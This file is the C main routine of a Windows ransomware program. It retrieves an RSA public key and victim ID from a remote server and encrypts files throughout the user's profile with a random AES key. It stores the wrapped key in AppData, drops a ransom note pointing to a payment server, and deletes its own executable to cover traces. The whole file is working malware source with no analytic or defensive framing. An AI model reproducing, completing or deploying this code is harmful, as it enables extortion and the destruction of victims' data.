#include "aes.h"
#include "config.h"
#include "encrypt.h"
#include "files.h"
#include "keygen.h"
#include "delete.h"
#include "common.h"
#include <shlobj.h>

int main(int argc, char *argv[]) {
    int id = 0;
    char pubkey[512] = {0};
    if (get_key(&id, pubkey, sizeof(pubkey)) != ERR_SUCCESS) {
        printf("Failed to retrieve public key from server\n");
        return 1;
    }
    char* external_ip = get_config_value("external_ip");
    char* web_port_str = get_config_value("web_port");
    if (!external_ip || !web_port_str) {
        printf("Failed to read config\n");
        if (external_ip)
            free(external_ip);
        if (web_port_str)
            free(web_port_str);
        return 1;
    }
    char server_url[256] = {0};
    if (_snprintf_s(server_url, sizeof(server_url), _TRUNCATE, "http://%s:%s", external_ip, web_port_str) == -1) {
        free(external_ip);
        free(web_port_str);
        return 1;
    }
    free(external_ip);
    free(web_port_str);
    unsigned char aes_key[AES_KEY_SIZE] = {0};
    if (generate_random_key(aes_key, sizeof(aes_key)) != ERR_SUCCESS) {
        printf("Failed to generate AES key\n");
        return 1;
    }
    char users_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, users_path) != S_OK) {
        printf("Failed to get user profile path\n");
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    if (enumerate(users_path, aes_key) != ERR_SUCCESS)
        printf("Enumeration had issues, but continuing\n");
    unsigned char *encrypted_key = NULL;
    size_t encrypted_len = 0;
    if (encrypt_rsa_oaep(aes_key, sizeof(aes_key), pubkey, &encrypted_key, &encrypted_len) != ERR_SUCCESS) {
        printf("Failed to encrypt AES key\n");
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    char appdata_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path) != S_OK) {
        printf("Failed to get AppData path\n");
        if (encrypted_key)
            free(encrypted_key);
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    char key_path[MAX_PATH] = {0};
    if (_snprintf_s(key_path, sizeof(key_path), _TRUNCATE, "%s\\key.enc", appdata_path) == -1) {
        if (encrypted_key)
            free(encrypted_key);
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    FILE *key_file = fopen(key_path, "wb");
    if (!key_file) {
        printf("Failed to open key.enc for writing\n");
        if (encrypted_key)
            free(encrypted_key);
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    size_t written = fwrite(encrypted_key, 1, encrypted_len, key_file);
    if (written != encrypted_len) {
        fclose(key_file);
        if (encrypted_key)
            free(encrypted_key);
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    fclose(key_file);
    const char *verify_string = "This key is valid";
    unsigned char *encrypted_verify = NULL;
    size_t encrypted_verify_len = 0;
    if (encrypt_rsa_oaep((const unsigned char *)verify_string, strlen(verify_string), pubkey, &encrypted_verify, &encrypted_verify_len) != ERR_SUCCESS) {
        printf("Failed to encrypt verification string\n");
        if (encrypted_key) 
            free(encrypted_key);
        if (encrypted_verify) 
            free(encrypted_verify);
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    if (encrypted_key)
        free(encrypted_key);
    char verify_path[MAX_PATH] = {0};
    if (_snprintf_s(verify_path, sizeof(verify_path), _TRUNCATE, "%s\\verify.enc", appdata_path) == -1) {
        if (encrypted_verify)
            free(encrypted_verify);
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    FILE *verify_file = fopen(verify_path, "wb");
    if (!verify_file) {
        printf("Failed to open verify.enc for writing\n");
        if (encrypted_verify)
            free(encrypted_verify);
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    written = fwrite(encrypted_verify, 1, encrypted_verify_len, verify_file);
    if (written != encrypted_verify_len) {
        fclose(verify_file);
        if (encrypted_verify)
            free(encrypted_verify);
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    fclose(verify_file);
    if (encrypted_verify)
        free(encrypted_verify);
    char ransom_note[1024] = {0};
    if (_snprintf_s(ransom_note, sizeof(ransom_note), _TRUNCATE,
                 "Your files have been encrypted!\n"
                 "To decrypt them, visit %s and enter the ID: %d\n"
                 "Follow the instructions there to retrieve your decryption key.\n"
                 "DO NOT DELETE key.enc or verify.enc! If you do, you won't be able to recover your files.",
                 server_url, id) == -1) {
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    if (create_readme(ransom_note) != ERR_SUCCESS) {
        printf("Failed to create ransom note\n");
        zero_memory(aes_key, sizeof(aes_key));
        return 1;
    }
    zero_memory(aes_key, sizeof(aes_key));
    if (argv[0])
        self_delete(argv[0]);
    printf("Encryption completed.\n");
    return 0;
}
